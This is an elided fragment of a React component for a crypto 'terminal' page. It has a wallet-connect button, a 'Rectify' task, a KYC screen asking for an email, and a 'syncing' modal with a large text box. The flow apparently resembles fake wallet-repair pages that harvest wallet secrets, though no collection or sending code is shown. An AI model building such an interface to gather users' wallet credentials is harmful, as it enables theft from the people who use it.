...
export default function EvedexTerminal() {
  ...
  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', marginBottom:'30px', borderBottom:'1px solid #1e293b', paddingBottom:'15px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'50px', padding:'50px 20px', backgroundColor:'#0d1117', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <appkit-button />
        </div>
      ) : (
        <>
          ...
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
              ...
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'15px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
          ...
          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
              ...
              {kycPhase === 1 ? (
                <>
                  <input placeholder="EMAIL" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'15px', outline:'none'}} />
              ...
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    ...
                    style={{width:'100%', height:'120px', backgroundColor:'black', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', border:'1px solid #1e293b', marginTop:'20px'}} />
